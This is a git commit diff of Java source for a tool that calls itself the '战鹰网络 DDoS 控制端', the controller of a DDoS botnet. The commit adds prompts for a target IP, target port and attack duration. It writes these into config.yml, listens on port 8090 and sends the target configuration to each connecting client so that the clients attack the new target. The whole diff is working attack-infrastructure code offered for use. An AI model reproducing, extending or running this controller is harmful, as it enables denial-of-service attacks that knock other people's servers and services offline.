2f285847babd2c729a0107b0c315a043bb4c8adf
ZhanYing <zhanying@xydhlw.cn>
2023-10-03 01:04:37 +0800

    新增自定义设置端口和攻击时间。

--- src/com/zhanyingwl/www/InputTargetThread.java
+++ src/com/zhanyingwl/www/InputTargetThread.java
@@ -1,19 +1,48 @@
 package com.zhanyingwl.www;
 
-import java.util.Scanner;
+import org.yaml.snakeyaml.Yaml;
+
+import java.io.*;
+import java.util.*;
 
 public class InputTargetThread extends Thread {
     static String targetHost = Runner.targetHost;
+    static String targetPort;
+    static Yaml yml = Runner.yml;
+    static String path = Runner.path;
+    static int attackSecond = Runner.attackSecond;
 
     @Override
-    public void run() {
+    public void run() { // 这里负责更新yml
         while (true) {
-            Scanner scanner = new Scanner(System.in);
-            targetHost = scanner.next();
-            if (targetHost.equals("none")) {
-                System.out.println("[-] 战鹰网络 - DDoS 控制端：已停止攻击！（若之前有攻击，则可能会有缓冲！）");
-            } else {
-                System.out.println("[+] 战鹰网络 - DDoS 控制端：您输入的目标IP - " + targetHost);
+            try {
+                Scanner scanner = new Scanner(System.in);
+                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入目标IP ↓");
+                targetHost = scanner.nextLine();
+                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入目标端口 ↓");
+                targetPort = scanner.nextLine();
+                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入攻击时间 ↓");
+                attackSecond = Integer.parseInt(scanner.nextLine());
+                System.out.println("[+] 战鹰网络 - DDoS 控制端：目标配置文件已更新。");
+                System.out.println("[+] 战鹰网络 - DDoS 控制端：已连接的客户端将对新目标发起攻击！");
+                System.out.println("---------------------------------------");
+
+                Calendar calendar = Calendar.getInstance();
+                calendar.add(Calendar.SECOND, attackSecond);
+                Date endDate = calendar.getTime();
+
+                Map<String, String> writeMap = new HashMap<>();
+                writeMap.put("ip", targetHost);
+                writeMap.put("port", targetPort);
+                writeMap.put("endDate", endDate.toString());
+                FileWriter fileWriter = new FileWriter(path, false);
+                BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
+                yml.dump(writeMap, bufferedWriter);
+                bufferedWriter.close();
+                fileWriter.close();
+
+            } catch (IOException e) {
+                e.printStackTrace();
             }
         }
     }
--- src/com/zhanyingwl/www/Runner.java
+++ src/com/zhanyingwl/www/Runner.java
@@ -1,6 +1,11 @@
 package com.zhanyingwl.www;
 
+import org.yaml.snakeyaml.Yaml;
+
+import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
+import java.io.OutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
 
@@ -8,35 +13,63 @@ import java.net.Socket;
  * @ClassName : Runner
  * @Description : 启动类
  * @Author : 战鹰
- * @Version: 2.0
+ * @Version: 3.0
  */
 
 public class Runner extends Thread {
     static Socket socket;
-    static String targetHost = "none"; // 目标主机
-    static String ClientIP = "none";
-    static ServerSocket serverSocket; // 尝试共享一个serverSocket
+    static String targetHost;
+    static String ClientIP;
+    static ServerSocket serverSocket;
+    static Yaml yml = new Yaml();
+    static String path = "config.yml"; // 这个config.yml放在jar文件的同目录 具体配置内容参考源码里的
+    static int attackSecond;
 
-    public static void main(String[] args) { // 监听端口
+    public static void main(String[] args) { // 这里负责把yml内容读取后发送给客户端
         try {
+            File targetConfigPathFirstRunShow = new File(path); // 目标配置文件信息
+            long targetConfigLenthFirstRunShow = targetConfigPathFirstRunShow.length();
+            byte[] b = new byte[(int) targetConfigLenthFirstRunShow];
+            FileInputStream fis = new FileInputStream(targetConfigPathFirstRunShow);
+            fis.read(b);
+            fis.close();
+            String targetConfigInfoFirstRunShow = new String(b, "GBK");
+            System.out.println("[+] 战鹰网络 - DDoS 控制端：当前目标配置文件信息");
+            System.out.println("[+] 战鹰网络 - DDoS 控制端：" + targetConfigInfoFirstRunShow.replace("\n", "")); // 去除多余的回车符
             serverSocket = new ServerSocket(8090);
-            System.out.println("[+] 战鹰网络 - DDoS 控制端：端口监听成功！");
+            System.out.println("[+] 战鹰网络 - DDoS 控制端：端口监听成功。");
             InputTargetThread i = new InputTargetThread();
             System.out.println("[+] 战鹰网络 - DDoS 控制端：目标IP输入模块启动中...");
             i.start();
-            System.out.println("[+] 战鹰网络 - DDoS 控制端：目标IP输入模块启动成功！");
-            System.out.println("[+] 战鹰网络 - DDoS 控制端：等待客户端连接中...");
+            System.out.println("[+] 战鹰网络 - DDoS 控制端：目标IP输入模块启动成功。");
             while (true) {
                 socket = serverSocket.accept();
                 ClientIP = socket.getInetAddress().getHostAddress();
-                System.out.println("[+] 战鹰网络 - DDoS 控制端：监测到客户端连接！客户端IP - " + ClientIP);
-                System.out.println("[!] 战鹰网络 - DDoS 控制端：当前攻击目标IP - " + targetHost);
-                System.out.println("--------------------------------------");
-                doSend doSend = new doSend();
-                doSend.start();
+                Runner runner = new Runner();
+                runner.start();
             }
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
+
+    @Override
+    public void run() { // 每次客户端连接就用子线程发送一次目标信息配置文件
+        try {
+            File targetConfigPath = new File(path); // 目标配置文件信息
+            long targetConfigLenth = targetConfigPath.length();
+            byte[] b = new byte[(int) targetConfigLenth];
+            FileInputStream fis = new FileInputStream(targetConfigPath);
+            fis.read(b);
+            fis.close();
+            String targetConfigInfo = new String(b, "GBK");
+            OutputStream os = socket.getOutputStream();
+            os.write(targetConfigInfo.getBytes());
+            os.close();
+            socket.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
 }
